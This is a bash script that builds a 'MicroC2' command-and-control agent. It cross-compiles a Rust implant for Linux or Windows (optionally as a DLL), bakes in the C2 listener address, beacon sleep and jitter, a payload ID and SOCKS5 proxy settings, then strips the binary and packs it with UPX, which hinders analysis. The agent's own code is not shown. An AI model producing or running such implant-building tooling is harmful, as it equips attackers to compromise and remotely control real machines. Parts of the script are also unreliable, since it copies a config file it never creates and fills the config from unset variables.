#!/bin/bash

echo "MicroC2 Agent Builder"
echo "============================="

# Parse command line arguments
TARGET=""
OUTPUT_DIR=""
BUILD_TYPE="release"
LISTENER_HOST=""
LISTENER_PORT=""
SLEEP_INTERVAL=60
JITTER=2
FORMAT=""
PAYLOAD_ID=""   # New variable to accept server-generated UUID

# Parse command line arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    --target)
      TARGET="$2"
      shift 2
      ;;
    --output)
      OUTPUT_DIR="$2"
      shift 2
      ;;
    --build-type)
      BUILD_TYPE="$2"
      shift 2
      ;;
    --format)
      FORMAT="$2"
      shift 2
      ;;
    --listener-host)
      LISTENER_HOST="$2"
      shift 2
      ;;
    --listener-port)
      LISTENER_PORT="$2"
      shift 2
      ;;
    --sleep)
      SLEEP_INTERVAL="$2"
      shift 2
      ;;
    --jitter)
      JITTER="$2"
      shift 2
      ;;
    --payload-id)
      PAYLOAD_ID="$2"
      shift 2
      ;;   # New case for payload ID
    *)
      echo "Unknown option: $1"
      shift
      ;;
  esac
done

# Validate required flags
if [ -z "$LISTENER_HOST" ] || [ -z "$LISTENER_PORT" ]; then
  echo "Error: --listener-host and --listener-port are required" >&2
  exit 1
fi

# Use environment variables if arguments not provided
if [ -z "$TARGET" ]; then
    TARGET=${TARGET:-"x86_64-unknown-linux-gnu"}
fi

# IMPORTANT: Properly set server address and port
if [ -z "$LISTENER_HOST" ]; then
    # Get primary interface IP, but don't use 0.0.0.0 as it's not routable
    DEFAULT_IP=$(ip route get 1 | awk '{print $7;exit}')
    # If the IP is 0.0.0.0 or empty, fall back to 127.0.0.1
    if [ -z "$DEFAULT_IP" ] || [ "$DEFAULT_IP" == "0.0.0.0" ]; then
        DEFAULT_IP="127.0.0.1"
    fi
    SERVER_IP=${LISTENER_HOST:-$DEFAULT_IP}
else
    SERVER_IP=$LISTENER_HOST
fi

# Use provided port or default to listener config port
SERVER_PORT=${LISTENER_PORT:-8443}

# Store original output dir (as provided by the server)
ORIGINAL_OUTPUT_DIR="$OUTPUT_DIR"

# Handle relative/absolute paths
if [[ "$OUTPUT_DIR" != /* ]]; then
    # If relative path, make it absolute from current directory
    OUTPUT_DIR="$(pwd)/$OUTPUT_DIR"
fi

# Determine payload ID if not provided
if [ -z "$PAYLOAD_ID" ]; then
    PAYLOAD_ID=$(basename "$OUTPUT_DIR")
    echo "Detected Payload ID: $PAYLOAD_ID"
else
    echo "Using provided payload ID: $PAYLOAD_ID"
fi

# Also figure out the server's full path
SERVER_DIR=$(dirname $(dirname "$OUTPUT_DIR"))
echo "Server path: $SERVER_DIR"

echo "Configuration:"
echo "  Target:       $TARGET"
echo "  Output Dir:   $OUTPUT_DIR"
echo "  Original Dir: $ORIGINAL_OUTPUT_DIR"
echo "  Server Dir:   $SERVER_DIR"
echo "  Build Type:   $BUILD_TYPE"
echo "  C2 Server:    ${SERVER_IP}:${SERVER_PORT}"
echo "  Sleep:        ${SLEEP_INTERVAL:-60} seconds"
echo "  Jitter:       ${JITTER:-2} seconds"
if [ -n "$FORMAT" ]; then
    echo "  Format:       ${FORMAT}"
fi

echo "Checking dependencies..."

# Install required packages if not present
if ! dpkg -l | grep -q "gcc-mingw-w64"; then
    echo "Installing gcc-mingw-w64..."
    sudo apt-get install -y gcc-mingw-w64
fi

# Install cross if not already installed
if ! command -v cross &> /dev/null; then
    echo "Installing cross..."
    cargo install cross
fi

# Generate agent config only in the payload output directory
mkdir -p "$OUTPUT_DIR/.config"
cat > "$OUTPUT_DIR/.config/config.json" << EOF
{
    "server_url": "${SERVER_IP}:${SERVER_PORT}",
    "sleep_interval": ${SLEEP_INTERVAL:-60},
    "jitter": ${JITTER:-2},
    "payload_id": "${PAYLOAD_ID}",
    "protocol": "${PROTOCOL}",
    "socks5_enabled": ${SOCKS5_ENABLED},
    "socks5_host": "${SOCKS5_HOST}",
    "socks5_port": ${SOCKS5_PORT}
}
EOF

echo "Created configuration for build-time embedding"

echo "Building agent..."

# Determine build command based on target
if [ "$BUILD_TYPE" == "debug" ]; then
    BUILD_FLAGS=""
else
    BUILD_FLAGS="--release"
fi

# Set up cargo features based on format
CARGO_FEATURES=""
if [ "$FORMAT" == "windows_dll" ]; then
    echo "Setting up for Windows DLL build with DLL feature enabled"
    CARGO_FEATURES="--features dll"
    
    # Create a .cargo/config.toml file to set the proper linker args for DLL
    mkdir -p .cargo
    cat > .cargo/config.toml << EOF
[target.x86_64-pc-windows-gnu]
rustflags = [
    "-C", "link-args=-Wl,--export-all-symbols",
    "-C", "prefer-dynamic"
]
EOF
    echo "Created .cargo/config.toml for DLL linking"
fi

# Set default BINARY_EXT
if [[ "$TARGET" == *windows* ]]; then
    BINARY_EXT=".exe"
else
    BINARY_EXT=""
fi

# Build the agent
echo "Building for $TARGET..."
if [[ "$TARGET" == *windows* ]]; then
    # Windows build
    if command -v cross &> /dev/null; then
        echo "Using cross for Windows build..."
        if [ "$FORMAT" == "windows_dll" ]; then
            echo "Building with DLL features: cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET"
            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
            cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
        else
            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
            cross build $BUILD_FLAGS --target $TARGET
        fi
    else
        echo "Cross tool not found, using direct cargo build..."
        # Make sure the Windows target is installed
        rustup target add $TARGET
        if [ "$FORMAT" == "windows_dll" ]; then
            echo "Building with DLL features: cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET"
            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
            cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
        else
            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
            cargo build $BUILD_FLAGS --target $TARGET
        fi
    fi
else
    # Linux build
    LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
    cargo build $BUILD_FLAGS --target $TARGET
fi

# Determine the build directory
if [ "$BUILD_TYPE" == "debug" ]; then
    BUILD_DIR="target/$TARGET/debug"
else
    BUILD_DIR="target/$TARGET/release"
fi

# Print contents of build directory for debugging
if [ -d "$BUILD_DIR" ]; then
    echo "Contents of $BUILD_DIR before copy:" >&2
    ls -la "$BUILD_DIR" >&2
else
    echo "Build directory $BUILD_DIR does not exist!" >&2
fi

# Copy the binary to the output directory (absolute path)
if [ -f "$BUILD_DIR/agent$BINARY_EXT" ]; then
    echo "Copying agent binary to output directory: $OUTPUT_DIR/agent$BINARY_EXT"
    mkdir -p "$OUTPUT_DIR"
    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent$BINARY_EXT"
    # Timestamped copy for reference
    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_agent$BINARY_EXT"
    echo "Agent binary copied successfully to specified output location"
else
    echo "ERROR: agent binary not found at $BUILD_DIR/agent$BINARY_EXT" >&2
    echo "Contents of $BUILD_DIR:" >&2
    ls -la "$BUILD_DIR" >&2
fi

echo "Build complete in $BUILD_DIR"

# Copy the binary to the output directory
if [ -f "$BUILD_DIR/agent$BINARY_EXT" ]; then
    echo "Copying agent binary to output directory: $OUTPUT_DIR/agent$BINARY_EXT"
    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent$BINARY_EXT"
    
    # We'll maintain the timestamped copy for reference
    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_agent$BINARY_EXT"
    
    echo "Agent binary copied successfully to specified output location"
    
    # IMPORTANT: Copy config.json to a location relative to the agent binary
    # This ensures the agent can find its config regardless of where it's run from
    echo "Embedding config.json with agent binary"
    # This special directory naming scheme will help the agent find its config
    mkdir -p "$OUTPUT_DIR/.config"
    cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
    
    # IMPORTANT: Also copy the agent to the server's expected location
    echo "Copying agent to server's expected location: $ORIGINAL_OUTPUT_DIR/agent$BINARY_EXT"
    mkdir -p "$(dirname "$ORIGINAL_OUTPUT_DIR")"
    cp "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent$BINARY_EXT"
    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/config.json"
    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
else
    echo "WARNING: agent binary not found at expected location: $BUILD_DIR/agent$BINARY_EXT"
    # List directory contents to aid debugging
    echo "Contents of $BUILD_DIR:"
    ls -la "$BUILD_DIR"
fi

# After copying the binary, strip and compress with upx if available
if [ -f "$OUTPUT_DIR/agent$BINARY_EXT" ]; then
    echo "Stripping binary..."
    strip "$OUTPUT_DIR/agent$BINARY_EXT" || true
    if command -v upx &> /dev/null; then
        echo "Compressing binary with upx..."
        upx --best --lzma "$OUTPUT_DIR/agent$BINARY_EXT"
    fi
fi

# For DLL format, we need to properly handle DLL creation
if [ "$FORMAT" == "windows_dll" ]; then
    echo "Creating Windows DLL..."
    
    # For Windows targets, handle DLL generation
    if [[ "$TARGET" == *windows* ]]; then
        # For Windows DLL, rename the binary if it doesn't have .dll extension
        if [ -f "$BUILD_DIR/agent$BINARY_EXT" ]; then
            # If using Rust's built-in DLL capability, the binary might already be a proper DLL
            # We just need to rename it to have .dll extension
            if [[ "$CARGO_FEATURES" == *dll* ]]; then
                echo "Copying agent.dll to $OUTPUT_DIR"
                cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent.dll"
                
                # Ensure the DLL is copied directly to the output directory to avoid path mismatch issues
                echo "Successfully created DLL at: $OUTPUT_DIR/agent.dll"
                
                # Also copy the config for DLL usage
                mkdir -p "$OUTPUT_DIR/.config"
                cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
                
                # Copy to server's expected location too
                cp "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent.dll"
                mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
                cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
                
                ls -la "$OUTPUT_DIR"
            else
                # Convert EXE to DLL using objcopy
                if command -v objcopy &> /dev/null; then
                    echo "Converting EXE to DLL using objcopy..."
                    objcopy --input-target=pe-x86-64 --output-target=pe-x86-64 --add-section .rdata="$BUILD_DIR/agent$BINARY_EXT" "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent.dll"
                    echo "Successfully created DLL at: $OUTPUT_DIR/agent.dll"
                    
                    # Also copy to server's expected location
                    objcopy --input-target=pe-x86-64 --output-target=pe-x86-64 --add-section .rdata="$BUILD_DIR/agent$BINARY_EXT" "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent.dll"
                    
                    # Also copy the config for DLL usage
                    mkdir -p "$OUTPUT_DIR/.config"
                    cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
                    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
                    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
                else
                    echo "objcopy not found, copying executable as DLL..."
                    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent.dll"
                    cp "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent.dll"
                    
                    # Also copy the config for DLL usage
                    mkdir -p "$OUTPUT_DIR/.config"
                    cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
                    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
                    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
                fi
            fi
        else
            echo "ERROR: Windows agent binary not found for DLL creation"
            exit 1
        fi
    else
        echo "ERROR: Cannot create Windows DLL for non-Windows target"
        exit 1
    fi
fi

# Ensure all files are in the correct location
echo "Final output directory contents:"
ls -la "$OUTPUT_DIR"

# Show the contents of the server directory as well
echo "Server directory contents:"
ls -la "$ORIGINAL_OUTPUT_DIR"

# If we built a DLL, verify it exists in the output directory
if [ "$FORMAT" == "windows_dll" ]; then
    if [ -f "$OUTPUT_DIR/agent.dll" ]; then
        echo "SUCCESS: agent.dll was found at $OUTPUT_DIR/agent.dll"
        # Display file size to confirm it's a valid file
        stat -c "File size: %s bytes" "$OUTPUT_DIR/agent.dll"
    else
        echo "ERROR: agent.dll was not found in the output directory"
        echo "This will cause the server to return 500 internal server error"
        exit 1
    fi
fi

echo "Build process completed"
